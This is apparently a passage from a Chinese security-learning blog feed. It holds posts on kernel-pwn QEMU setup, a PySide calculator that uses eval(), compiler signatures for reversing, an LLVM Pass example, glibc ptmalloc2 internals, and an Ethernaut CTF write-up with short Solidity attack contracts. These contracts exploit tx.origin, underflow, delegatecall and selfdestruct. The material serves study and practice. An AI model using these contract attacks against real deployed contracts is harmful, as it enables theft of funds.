<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment"># 打包的文件系统在上一级目录下</span></span><br></pre></td></tr></table></figure>
<h1>启动！</h1>
<p>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>Kernel PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt6学习第一天——基础框架、信号与槽和第一个计算器程序</title>
    <url>/2024/08/09/PyQt6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="基础框架">基础框架</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
<h2 id="第一个计算器程序">第一个计算器程序</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QWidget, QApplication</span><br><span class="line"><span class="keyword">from</span> Ui_Calculator <span class="keyword">import</span> Ui_Form</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">calcWindow</span>(QWidget, Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.setupUi(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 批量为 btn0 到 btn9 添加点击事件</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">f&#x27;btn<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, b=button: <span class="variable language_">self</span>.addNumber(b.text()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为运算按钮添加点击事件</span></span><br><span class="line">        operators = &#123;</span><br><span class="line">            <span class="string">&#x27;btn_multiply&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_divide&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_substract&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_plus&#x27;</span>: <span class="string">&#x27;+&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> btn_name, symbol <span class="keyword">in</span> operators.items():</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, btn_name)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, s=symbol: <span class="variable language_">self</span>.addNumber(s) <span class="keyword">if</span> <span class="variable language_">self</span>.isValid() <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.btn_equal.clicked.connect(<span class="variable language_">self</span>.calcResult)</span><br><span class="line">        <span class="variable language_">self</span>.btn_clear.clicked.connect(<span class="variable language_">self</span>.clearBox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clearBox</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.result_box.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calcResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="variable language_">self</span>.result))</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(result)</span><br><span class="line">            <span class="variable language_">self</span>.result = result</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Cannot divide by zero&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result_box.text()[-<span class="number">1</span>:].isdigit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self, num: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.result += num</span><br><span class="line">        <span class="variable language_">self</span>.result_box.setText(<span class="variable language_">self</span>.result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = calcWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PyQT</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse学习第一周——特征和壳</title>
    <url>/2024/08/08/Reverse%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%88%9D%E8%AF%86%E9%80%86%E5%90%91%E4%B8%8E%E5%A3%B3/</url>
    <content><![CDATA[<h1>什么是特征？</h1>
<p>每一种编程语言或者编译器所编译出来的程序都有其独特的特征，其通常表现在：<code>入口点</code>，<code>程序区段</code>，<code>加载模块</code>等。</br>下面就各种语言和编译器所编译出来的程序进行分析。</p>
<h2 id="VC6">VC6</h2>
<p>使用OllyDbg查看<img src="/images/pasted-2.png" alt="upload successful"><br>
可以看到其入口点代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
<p>使用Exeinfope查看区段情况<br>
<img src="/images/pasted-3.png" alt="upload successful"></p>
<h3 id="总结">总结</h3>
<p>在入口点代码上，VC6程序使用了固定的两行代码，其调用的API也是相同的</br>在程序区段上，VC6程序的区段为固定的<code>.text</code>,<code>.rdata</code>,<code>.data</code>,<code>.rsrc</code></p>
<h2 id="VS2008-VS2013">VS2008&amp;VS2013</h2>
<p>使用OllyDbg查看<br>
2008:<br>
<img src="/images/pasted-6.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-5.png" alt="upload successful"><br>
其入口点代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call xxx ;调用模块相同</span><br><span class="line">jmp xxx</span><br></pre></td></tr></table></figure>
<p>使用Exeinfope查看区段情况<br>
2008:<br>
<img src="/images/pasted-7.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-8.png" alt="upload successful"><br>
相较于VC6多了一个<code>.reloc</code>段</p>
<h3 id="总结-2">总结</h3>
<p>VS2008&amp;VS2013的入口点代码特征为先call后jmp，区段相较vc6多一个<code>.reloc</code>段</p>
<h2 id="易语言独立-非独立-编译程序">易语言独立(非独立)编译程序</h2>
<p>使用OllyDbg查看入口点代码非独立编译：<img src="/images/pasted-10.png" alt="upload successful"><br>
第一个call作用我感觉是进入主函数（main）的意思，后面则定义了几个字符串进入到<code>0x40108E</code>后，<code>0x40109E</code>开始调用<code>krnln.fnr</code>库</p>
<blockquote>
<p>易语言程序在非独立编译后，会生成两个运行所需的依赖库分别为<code>krnln.fnr</code>和<code>krnln.fne</code></p>
</blockquote>
<p>还有个很独特的特征，就是在每次call完之后，都会返回到一个核心函数中<img src="/images/pasted-12.png" alt="upload successful"><br>
在我理解看来，这个操作和C语言中调用库函数会触发延迟绑定重定向到真正函数的操作差不多</p>
<p>使用Exeinfope查看区段情况<img src="/images/pasted-11.png" alt="upload successful"><br>
可以看到区段情况和<strong>VC6</strong>相同</p>
<h3 id="总结-3">总结</h3>
<p>从入口点代码特征上看，易语言程序先是call到主函数，后面则定义了几个字符串</br>从程序执行流程代码上看，每次调用函数，会触发重定向操作</br>从区段上看，和<strong>VC6</strong>相同</p>
<h2 id="Delphi">Delphi</h2>
]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>llvm学习（1）</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Pass学习（1）</h1>
<p>因为不想再在这种题上爆零，所以开了这个系列😭</p>
<h2 id="LLVM-Pass概述">LLVM Pass概述</h2>
<p>LLVM Pass 是一个在 LLVM 编译框架中执行的独立的代码变换或优化步骤。LLVM 本身是一个开源的编译器框架，广泛用于生成机器代码、优化代码和进行程序分析。Pass 是 LLVM 中处理中间表示（IR, Intermediate Representation）的基本单位。</p>
<h3 id="具体概念解释：">具体概念解释：</h3>
<ol>
<li class="lvl-3">
<p><strong>中间表示（IR）</strong>：<br>
LLVM 使用一种称为中间表示（IR）的低级代码格式，介于源代码和机器代码之间。IR 更加抽象，不依赖于任何特定的硬件架构，便于进行优化和转换。</p>
</li>
<li class="lvl-3">
<p><strong>Pass</strong>：在 LLVM 中，Pass 是对 IR 进行某种操作的单元。每个 Pass 会执行特定的任务，如优化、分析或者代码转换。Pass 会遍历 IR，并对其进行修改或分析，生成更有效的代码。</p>
<p>Pass 可以分为两大类：</p>
<ul class="lvl-2">
<li class="lvl-5">
<p><strong>分析 Pass</strong>：这类 Pass 只对程序进行分析，不会修改代码。例如，分析程序的控制流、数据流、依赖关系等。</p>
</li>
<li class="lvl-5">
<p><strong>变换 Pass</strong>：这类 Pass 会对代码进行修改，通常用于优化。比如，消除无用代码（Dead Code Elimination）、循环展开（Loop Unrolling）等。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>优化</strong>：<br>
LLVM Pass 的重要功能之一是优化，优化可以帮助生成运行更高效的代码。优化的类型有很多，包括：</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>常量传播</strong>（Constant Propagation）：用已知的常量值替换表达式。</li>
<li class="lvl-5"><strong>循环优化</strong>：对循环进行优化，如循环合并、循环展开等。</li>
<li class="lvl-5"><strong>死代码消除</strong>（Dead Code Elimination）：删除不影响程序结果的代码。</li>
<li class="lvl-5"><strong>内联</strong>（Inlining）：将函数调用替换为函数体，以减少函数调用的开销。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>Pass 管理器</strong>：在 LLVM 中，多个 Pass 会被组合在一起，形成一个 Pass 管理器（Pass Manager）。Pass 管理器负责管理和执行所有的 Pass，并确保它们按照正确的顺序执行。Pass 可以是一个独立的步骤，也可以按需组合执行。</p>
</li>
<li class="lvl-3">
<p><strong>优化级别</strong>：<br>
LLVM 提供不同的优化级别（如 <code>-O1</code>、<code>-O2</code>、<code>-O3</code>）来控制 Pass 的应用程度。不同的级别表示不同的优化强度，高级别可能会使用更复杂的优化，但也可能会增加编译时间。</p>
</li>
</ol>
<h3 id="人话：">人话：</h3>
<p>假设有一段程序，它做了很多重复的计算。如果使用 LLVM Pass 来优化代码，Pass 可能会发现这些计算是冗余的（例如，两个相同的加法操作），然后将其优化成更简单的代码，从而加速程序的执行。</p>
<p>总结来说，LLVM Pass 是一种对代码进行优化和变换的机制，通过多个独立的 Pass 对中间表示进行操作，最终帮助生成更加高效的机器代码。</p>
<h2 id="小试牛刀">小试牛刀</h2>
<blockquote>
<p>环境为Ubuntu20.04，llvm版本为llvm-9</p>
</blockquote>
<p>首先准备一段官方资料给的测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/Function.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Pass.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Support/raw_ostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/LegacyPassManager.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Transforms/IPO/PassManagerBuilder.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其中，Hello模块的功能为输出程序所有的函数名接着将其编译为so文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<p>现在再随便准备一个C语言程序，将其编译为<code>.ll</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure>
<p>最后使用opt加载so文件，测试下hello模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opt -load ./LLVMFirst.so -hello test.ll</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>LLVM PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>llvm学习（2）</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Pass学习（2）</h1>
]]></content>
  </entry>
  <entry>
    <title>区块链安全入门#2</title>
    <url>/2025/02/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-2/</url>
    <content><![CDATA[<h2 id="jfoUX">Ethernaut靶场</h2>
<h3 id="w0Ihj">level4</h3>
<p><strong>关键知识点：</strong><code>tx.origin</code>和<code>msg.sender</code>的区别</p>
<blockquote>
<h2 id="txorigin-vs-msgsender"><font style="color:rgba(0, 0, 0, 0.87);">tx.origin vs msg.sender</font>[¶](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)</h2>
<ul class="lvl-1">
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">这里区分一下 tx.origin 和 msg.sender ，msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</font></li>
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">给定这样一个场景如：用户通过合约 A 调合约 B，此时：</font>
<ul class="lvl-3">
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 A : tx.origin 和 msg.sender 都是用户</font></li>
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 B : tx.origin 是用户，msg.sender 是合约 A</font></li>
</ul>
</li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);">                                                             ——CTF-WIKI</font></p>
</blockquote>
<h4 id="C2kEY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  Telephone pubclic target = Telephone(&#x27;账户地址&#x27;);</span><br><span class="line">  function pwn() public&#123;</span><br><span class="line">    target.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="lTz9G">level5</h3>
<p>**关键知识点：**溢出攻击</p>
<h4 id="cqWqf">POC</h4>
<p>版本0.6，存在下界溢出且无溢出保护，直接转21使得banlances=-1即可</p>
<h3 id="quy5G">level6</h3>
<p>**关键知识点：**委托调用</p>
<p>委托调用就相当于把另一个函数的的代码照抄照搬过来然后调用</p>
<h4 id="ugyxx">POC</h4>
<p>msg.data填为pwn函数地址即可</p>
<h3 id="dxFLn">level7</h3>
<p>**关键知识点：**自毁合约——<code>selfdestruct</code></p>
<h4 id="V6lNY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  function pwn(address _target) payable public &#123;</span><br><span class="line">    selfdestruct(payable(_target));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="eYpDx">level8</h3>
<p><strong>关键知识点：<strong>区块链特性——记录</strong>公开透明</strong></p>
<h4 id="D5TNf">POC</h4>
<p>翻转账记录，因为在区块链浏览器上所有数据都是公开透明的</p>
<h2 id="JrJRU">重入攻击</h2>
<p>我对重入攻击的理解是回调函数中断条件一直不被满足而导致的函数重复不断的调用</p>
<p>CTF-WIKI上的解释：</p>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">Re-Entrancy - CTF Wiki</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc2_源码详解_part1</title>
    <url>/2025/08/04/ptmalloc2-%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part1/</url>
    <content><![CDATA[<h1>ptmalloc2源码详解 Part1</h1>
<p>本系列讲解的版本为Glibc2.23</p>
<p>高版本的diff比如tcache bin的增加等会被放在heap exploitation系列中进行分析</p>
<hr>
<p>在正式开始malloc流程分析的讲解之前，我们先来了解点基础知识</p>
<h2 id="Chunk">Chunk</h2>
<p>在ptmalloc中，无论是申请内存还是释放内存，操作的对象都为<strong>堆块(Chunk)</strong></p>
<p>其在源码中的结构体表示为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一个chunk结构体中有六个字段，但是对于后两个字段：<code>fd_nextsize</code>和<code>bk_nextsize</code>，只有大小符合large bin的堆块才会用到，所以一个普通堆块的最小占用空间为<strong>4*INTERNAL_SIZE_T字节</strong>。</p>
<blockquote>
<p>INTERNAL_SIZE_T为机器字长</p>
<p>对于64位来讲，INTERNAL_SIZE_T的大小为8字节，那么堆块最小占用空间就为0x20字节</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">已申请堆块在内存中形如:</span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of previous chunk, if allocated            | |</span><br><span class="line">	    			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h3 id="prev-size">prev_size</h3>
<p>这个字段只有当低地址的堆块被释放后才会被使用，<strong>指示了前一个堆块的大小</strong></p>
<p>这也就<strong>意味着此处空间是可以被复用的</strong>，即两个已分配堆块，前一个堆块可以使用后一个堆块的prev_size字段的空间</p>
<h3 id="size">size</h3>
<p><strong>当前堆块的大小</strong></p>
<p>在上图中可以看到<code>size</code>的最低位有两个字符<code>M</code>和<code>P</code>，其中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>P(PREV_INUSE)</strong>：该位被设置时，代表上一个堆块是一个正在使用的堆块</p>
</li>
<li class="lvl-2">
<p>**M(IS_MMAPED)：**该位被设置时，代表堆块内存是通过mmap分配的</p>
</li>
</ul>
<p>这里还有一个上图中未被提到的字段</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>**A(NON_MAIN_ARENA)：**记录当前堆块是否属于主进程</p>
</li>
</ul>
<p>这三个字段从高位到低位排序为：A-&gt;M-&gt;P</p>
<h3 id="fd和bk">fd和bk</h3>
<p><strong>双向链表中的前向和后继指针，只有当堆块被释放时才会被使用</strong></p>
<p>在堆块处于<strong>被分配状态时</strong>，从fd字段开始为用户空间，即上图中mem指向的位置</p>
<h3 id="fd-nextsize和bk-nextsize">fd_nextsize和bk_nextsize</h3>
<p>作用同fd和bk，但是<strong>只有大小处在largebin区间</strong>中的被释放的堆块才会使用这两个字段</p>
<h2 id="Chunk相关操作">Chunk相关操作</h2>
<p>在ptmalloc中，用户申请的内存大小和实际申请的内存大小是不一样的</p>
<h3 id="request2size">request2size</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="line"></span><br><span class="line">/* The corresponding bit mask value */</span><br><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line"></span><br><span class="line">/* The smallest possible chunk */</span><br><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="line"></span><br><span class="line">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="line">#define MINSIZE  \</span><br><span class="line">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>假设在64位下此时用户想要申请0x20大小的内存</p>
<p>ptmalloc会使用<code>request2size</code>宏函数检查0x20(req)+0x8(SIZE_SZ)+0xf(MALLOC_ALIGN_MASK)是否小于0x20(MINSIZE)</p>
<p>如果小于的话，直接返回MINSIZE给用户，否则返回(0x20+0x8+0xf)&amp;~0xf即0x30给用户</p>
<p>这也就意味着：</p>
<ol>
<li class="lvl-3">
<p><strong>当申请小于0x20大小堆内存的时候，系统会直接返回0x20给用户</strong></p>
</li>
<li class="lvl-3">
<p><strong>当申请大于0x20大小堆内存的时候，系统会给原来申请大小加上0x10（prev_size和size字段所占用空间）并且最终对其到0x10</strong></p>
</li>
</ol>
<p>prev_size和size字段所处空间对于用户来说是透明的，因此对于最终返回给用户的指针是需要进行一些处理的</p>
<h3 id="chunk2mem、mem2chunk">chunk2mem、mem2chunk</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
<p>对于已经分配的 chunk，通过 chunk2mem 宏根据 chunk 地址获得返回给用户的内存地址</p>
<p>反过来通过 mem2chunk 宏根据 mem 地址得到 chunk 地址</p>
<p>chunk 的地址是按 2*SIZE_SZ对齐的，而 chunk 结构体的前两个域刚好也是 2*SIZE_SZ 大小，所以，mem 地址也是 2*SIZE_SZ 对齐的</p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>ptmalloc源码详解</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全入门</title>
    <url>/2025/02/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1>0x01 钱包创建</h1>
<h2 id="安装MetaMask拓展">安装MetaMask拓展</h2>
<p>可以在<a href="https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn?hl=zh-CN&amp;utm_source=ext_sidebar">Chrome拓展商店</a>下载并安装MetaMask拓展</p>
